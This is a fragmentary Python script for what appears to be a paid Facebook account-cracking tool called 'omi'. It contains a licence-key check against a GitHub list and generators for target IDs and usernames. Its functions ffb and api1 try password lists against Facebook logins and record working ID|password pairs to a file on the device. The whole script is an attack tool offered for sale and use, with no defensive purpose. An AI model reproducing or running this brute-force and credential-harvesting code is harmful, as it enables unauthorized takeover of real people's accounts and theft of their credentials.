...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/LALASHhERRY/Approved/omi/Approved.txt').text
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join omi  Group ")
      print('Copy Key and send omi  Owner')
      print('Command paid its not free')
      print('\33[1;97m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      os.system('xdg-open https://www.facebook.com/kabsundisb')
      time.sleep(1)
      exit()
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi omi  Sir, I Need To Buy Your Paid omi  PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as omi :     
                        clear()
                        tl = str(len(user))
...
def gmail():
                ...
                for xd in range(limit):
                        ...
                        if '3' in lchoice:
                                ...
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+doomi+'|'+first+' '+last+'\n')
                        else:
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        omi =session.cookies.get_dict().keys()
                        if "c_user" in omi :
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in omi :
                                if 'y' in pcp:
                                        print('\r\033[1;97m omi -CP '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32momi -OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/omi -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32momi -OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/omi -OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
